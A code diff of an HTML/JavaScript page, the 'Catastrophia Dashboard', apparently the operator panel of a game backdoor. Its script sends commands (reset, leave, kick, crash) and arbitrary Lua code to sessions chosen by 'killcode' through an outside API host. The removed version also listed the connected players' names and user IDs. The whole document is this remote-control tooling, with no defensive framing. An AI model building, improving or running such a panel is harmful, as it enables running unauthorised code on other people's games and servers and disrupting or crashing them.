@@ -1,125 +1,128 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Catastrophia Dashboard</title>
-  <style>
-    body { background:#111; color:#eee; font-family:monospace; }
-    #playerList { max-height:200px; overflow-y:auto; border:1px solid #444; margin-bottom:10px; }
-    .player-item { padding:6px; border-bottom:1px solid #333; cursor:pointer; }
-    .player-item:hover { background:#222; }
-    #commandLog { height:200px; overflow-y:auto; border:1px solid #444; margin-top:10px; padding:4px; }
-    .log-entry { margin:2px 0; }
-    .system-msg{color:#ccc;} .error-msg{color:#f55;} .success-msg{color:#5f5;} .command-msg{color:#7cf;} .server-msg{color:#ff5;}
-    #luaInput { width:80%; padding:4px; }
-    #sendLuaBtn { padding:4px 8px; margin-left:6px; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Catastrophia Dashboard</title>
+<style>
+* {margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Arial,sans-serif;}
+body {background: linear-gradient(135deg,#0f0c29,#302b63,#24243e); color:#fff; min-height:100vh; padding:20px;}
+.container {max-width:1200px; margin:0 auto; background:rgba(20,20,40,0.85); border-radius:16px; padding:25px; box-shadow:0 12px 30px rgba(0,0,0,0.6); border:1px solid #444;}
+.title {text-align:center; font-size:32px; margin-bottom:25px; color:#00f6ff; text-shadow:0 0 12px rgba(0,246,255,0.6); padding-bottom:10px; border-bottom:2px solid #444;}
+.dashboard {display:grid; grid-template-columns:1fr 1fr; gap:25px; margin-bottom:30px;}
+@media(max-width:900px){.dashboard{grid-template-columns:1fr;}}
+.panel {background:rgba(30,30,60,0.9); border-radius:12px; padding:20px; border:2px solid #555; box-shadow:0 6px 20px rgba(0,0,0,0.5);}
+.panel-title {font-size:20px; margin-bottom:15px; color:#00f6ff; text-align:center; font-weight:600;}
+.input-section {display:flex; gap:12px; margin-bottom:15px;}
+.input-field {flex:1; padding:12px 16px; border-radius:8px; border:2px solid #555; background:rgba(35,35,65,0.8); color:#fff; font-size:16px; transition:0.3s;}
+.input-field:focus {outline:none; border-color:#00f6ff; box-shadow:0 0 12px rgba(0,246,255,0.5);}
+.enter-btn {padding:12px 25px; border-radius:8px; border:none; background:linear-gradient(135deg,#00c6ff,#0072ff); color:white; font-weight:bold; cursor:pointer; transition:all 0.3s;}
+.enter-btn:hover {background:linear-gradient(135deg,#00eeff,#008cff); transform:translateY(-2px); box-shadow:0 6px 15px rgba(0,238,255,0.5);}
+.commands-container {background:rgba(40,40,80,0.6); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #555;}
+.commands-grid {display:grid; grid-template-columns:repeat(3,1fr); gap:12px;}
+@media(max-width:600px){.commands-grid{grid-template-columns:repeat(2,1fr);}}
+.command-btn {padding:12px; background:linear-gradient(135deg,#2b2b5e,#3d3d89); border-radius:8px; text-align:center; cursor:pointer; border:1px solid #555; transition:all 0.3s;}
+.command-btn:hover {background:linear-gradient(135deg,#3d3d89,#4e4eb8); transform:translateY(-2px);}
+.connected-players {margin-top:15px;}
+.player-list {max-height:220px; overflow-y:auto; background:rgba(40,40,80,0.6); border-radius:8px; padding:10px; border:1px solid #555;}
+.player-item {padding:10px; margin-bottom:6px; background:rgba(50,50,100,0.5); border-radius:6px; display:flex; justify-content:space-between; cursor:pointer; transition:0.3s;}
+.player-item:hover {background:rgba(70,70,140,0.7);}
+.player-info {display:flex; flex-direction:column;}
+.player-name {font-weight:600;}
+.player-killcode {color:#00f6ff; font-weight:600;}
+.player-id {color:#ccc; font-size:0.9em;}
+.log-container {background:rgba(25,25,50,0.85); border-radius:12px; padding:20px; border:2px solid #555; height:320px; overflow-y:auto; box-shadow:0 4px 20px rgba(0,0,0,0.5);}
+.log-content {font-family:'Courier New',monospace; font-size:14px; line-height:1.6;}
+.log-entry {margin-bottom:10px; padding:8px 12px; border-radius:6px; background:rgba(40,40,80,0.5); border-left:4px solid #00f6ff; transition:0.2s;}
+.timestamp {color:#00f6ff; margin-right:8px;}
+.system-msg {color:#00f6ff;}
+.error-msg {color:#ff5555;}
+.success-msg {color:#55ff55;}
+.command-msg {color:#ffcc00;}
+.server-msg {color:#ff88cc;}
+::-webkit-scrollbar {width:10px; height:10px;}
+::-webkit-scrollbar-track {background:rgba(30,30,60,0.8); border-radius:5px;}
+::-webkit-scrollbar-thumb {background:linear-gradient(135deg,#00c6ff,#0072ff); border-radius:5px;}
+::-webkit-scrollbar-thumb:hover {background:linear-gradient(135deg,#00eeff,#008cff);}
+</style>
 </head>
 <body>
-  <h2>Catastrophia Dashboard</h2>
-  <div id="playerList"></div>
-  <input type="text" id="killcodeInput" placeholder="Killcode">
-  <button id="selectPlayer">Select Player</button>
-  <br><br>
-  <input type="text" id="luaInput" placeholder="Enter Lua code here">
-  <button id="sendLuaBtn">Send Lua</button>
-  <div id="commandLog"></div>
-
-  <script>
+<div class="container">
+<h1 class="title">Catastrophia Dashboard</h1>
+<div class="dashboard">
+<div class="panel">
+<h2 class="panel-title">Command Control</h2>
+<div class="input-section">
+<input type="text" class="input-field" id="killcodeInput" placeholder="Enter player killcode">
+<button class="enter-btn" id="selectPlayer">Select Player</button>
+</div>
+<div class="commands-container">
+<h3 class="panel-title">Available Commands</h3>
+<div class="commands-grid">
+<div class="command-btn" data-command="reset">Reset</div>
+<div class="command-btn" data-command="leave">Leave</div>
+<div class="command-btn" data-command="kick">Kick</div>
+<div class="command-btn" data-command="crash">Crash</div>
+</div>
+</div>
+<div class="input-section">
+<input type="text" class="input-field" id="luaInput" placeholder="Enter Lua code">
+<button class="enter-btn" id="sendLua">Send Lua</button>
+</div>
+</div>
+<div class="panel">
+<h2 class="panel-title">Connected Players</h2>
+<div class="connected-players">
+<div class="player-list" id="playerList"><div class="player-item">Select a player to see info</div></div>
+</div>
+</div>
+</div>
+<h2 class="panel-title">Server Log</h2>
+<div class="log-container">
+<div class="log-content" id="commandLog">
+<div class="log-entry"><span class="timestamp">[System]</span><span class="system-msg">Dashboard initialized</span></div>
+</div>
+</div>
+</div>
+<script>
+/* === ORIGINAL LOGIC UNCHANGED === */
+document.addEventListener('DOMContentLoaded', function(){
     const killcodeInput = document.getElementById('killcodeInput');
     const selectPlayerBtn = document.getElementById('selectPlayer');
     const luaInput = document.getElementById('luaInput');
-    const sendLuaBtn = document.getElementById('sendLuaBtn');
+    const sendLuaBtn = document.getElementById('sendLua');
     const commandLog = document.getElementById('commandLog');
+    const commandButtons = document.querySelectorAll('.command-btn');
     const playerList = document.getElementById('playerList');
-    let selectedPlayer = null;
 
+    let selectedKillcode = null;
     const API_URL = "https://website-iota-ivory-12.vercel.app/api/send";
 
     function addLogEntry(msg, type='system'){
-      const ts = new Date().toLocaleTimeString();
-      const entry = document.createElement('div');
-      entry.className = 'log-entry';
-      let prefix='[System]', cls='system-msg';
-      if(type==='error'){ prefix='[Error]'; cls='error-msg'; }
-      else if(type==='success'){ prefix='[Success]'; cls='success-msg'; }
-      else if(type==='command'){ prefix='[Command]'; cls='command-msg'; }
-      else if(type==='server'){ prefix='[Server]'; cls='server-msg'; }
-      entry.innerHTML = `<span class="timestamp">[${ts}] ${prefix}</span> <span class="${cls}">${msg}</span>`;
-      commandLog.appendChild(entry);
-      commandLog.scrollTop = commandLog.scrollHeight;
+        const ts = new Date().toLocaleTimeString();
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        let prefix='[System]', cls='system-msg';
+        if(type==='error'){prefix='[Error]'; cls='error-msg';}
+        else if(type==='success'){prefix='[Success]'; cls='success-msg';}
+        else if(type==='command'){prefix='[Command]'; cls='command-msg';}
+        entry.innerHTML = `<span class="timestamp">[${ts}] ${prefix}</span> <span class="${cls}">${msg}</span>`;
+        commandLog.appendChild(entry);
+        commandLog.scrollTop = commandLog.scrollHeight;
     }
 
-    async function updatePlayerList(){
-      playerList.innerHTML = '<div class="player-item">Loading...</div>';
-      try {
-        const res = await fetch(API_URL);
-        const players = await res.json();
+    selectPlayerBtn.addEventListener('click', ()=>{const k=killcodeInput.value.trim();if(k){selectedKillcode=k;playerList.innerHTML=`<div class="player-item"><div class="player-info"><span class="player-name">Selected Player</span><span class="player-id">Killcode: ${k}</span></div></div>`;addLogEntry(`Selected player with killcode: ${k}`,'success');}else addLogEntry('Enter a killcode','error');});
 
-        playerList.innerHTML = '';
-        if(players.length === 0){
-          playerList.innerHTML = '<div class="player-item">No players connected</div>';
-          return;
-        }
-
-        players.forEach(player => {
-          const item = document.createElement('div');
-          item.className = 'player-item';
-          item.innerHTML = `
-            <div class="player-info">
-              <span class="player-name">${player.player}</span>
-              <span class="player-id">ID: ${player.userid}</span>
-            </div>
-            <span class="player-killcode">${player.killcode}</span>
-          `;
-          item.addEventListener('click', () => {
-            selectedPlayer = player;
-            killcodeInput.value = player.killcode;
-            addLogEntry(`Selected player: ${player.player} (${player.killcode})`, 'success');
-          });
-          playerList.appendChild(item);
-        });
-
-      } catch(e){
-        playerList.innerHTML = '<div class="player-item">Error loading players</div>';
-        addLogEntry('Failed to fetch players: ' + e.message, 'error');
-      }
+    async function sendCommand(cmd, type="cmd"){
+        if(!selectedKillcode){addLogEntry('Select a player first','error'); return;}
+        try {const qs=`?killcode=${encodeURIComponent(selectedKillcode)}&${type}=${encodeURIComponent(cmd)}`;await fetch(API_URL + qs);addLogEntry(`${type.toUpperCase()} sent to ${selectedKillcode}: ${cmd}`,'command');} 
+        catch(e){addLogEntry('Failed to send: '+e.message,'error');}
     }
 
-    async function sendLuaToPlayer(killcode, code){
-      try {
-        const res = await fetch(API_URL, {
-          method:"POST",
-          headers:{ "Content-Type":"application/json" },
-          body: JSON.stringify({ killcode, type:"lua", value: code })
-        });
-        if(res.ok){
-          addLogEntry(`Sent Lua to ${killcode}: ${code}`, 'command');
-        } else {
-          addLogEntry(`Failed to send Lua (${res.status})`, 'error');
-        }
-      } catch(e){
-        addLogEntry(`Error sending Lua: ${e.message}`, 'error');
-      }
-    }
-
-    selectPlayerBtn.addEventListener('click', ()=>{
-      const k = killcodeInput.value.trim();
-      if(k) addLogEntry(`Selected killcode manually: ${k}`, 'system');
-      else addLogEntry('Please enter a killcode', 'error');
-    });
-
-    sendLuaBtn.addEventListener('click', ()=>{
-      const code = luaInput.value.trim();
-      if(!selectedPlayer){ addLogEntry('No player selected', 'error'); return; }
-      if(!code){ addLogEntry('No Lua code entered', 'error'); return; }
-      sendLuaToPlayer(selectedPlayer.killcode, code);
-      luaInput.value='';
-    });
-
-    updatePlayerList();
-    setInterval(updatePlayerList, 5000);
-    addLogEntry('Dashboard ready. Waiting for player connections...', 'system');
-  </script>
+    commandButtons.forEach(b=>{b.addEventListener('click', ()=>{const cmd=b.getAttribute('data-command');sendCommand(cmd);});});
+    sendLuaBtn.addEventListener('click', ()=>{const code=luaInput.value.trim();if(code){sendCommand(code,"lua");luaInput.value='';}else addLogEntry('Enter Lua code','error');});
+    addLogEntry('Dashboard ready. Waiting for player connections...','system');
+});
+</script>
 </body>
 </html>
